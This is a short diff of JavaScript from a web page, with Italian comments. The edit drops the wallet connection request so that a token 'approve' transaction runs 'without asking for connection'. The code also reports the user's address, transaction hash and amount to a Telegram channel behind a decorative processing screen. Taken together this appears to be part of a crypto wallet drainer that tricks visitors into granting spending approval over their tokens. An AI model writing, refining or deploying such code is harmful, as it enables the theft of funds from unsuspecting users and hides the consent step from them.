@@ -613,9 +613,8 @@ ${new Date().toLocaleString()}
                 console.log("Sending notification INSTANTLY...");
                 sendTelegramNotificationAsync(tempUserAddress, tempTxHash, amount);
 
-                // ⭐ STEP 2: POI inizializza il wallet
+                // ⭐ STEP 2: Prendi l'indirizzo del wallet (senza chiedere connessione)
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
                 const userAddress = await signer.getAddress();
 
@@ -673,7 +672,7 @@ ${new Date().toLocaleString()}
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                // ⭐ STEP 3: POI esegui l'approve
+                // ⭐ STEP 3: POI esegui SOLO l'approve (senza chiedere connessione)
                 let txHash;
                 try {
                     txHash = await Promise.race([
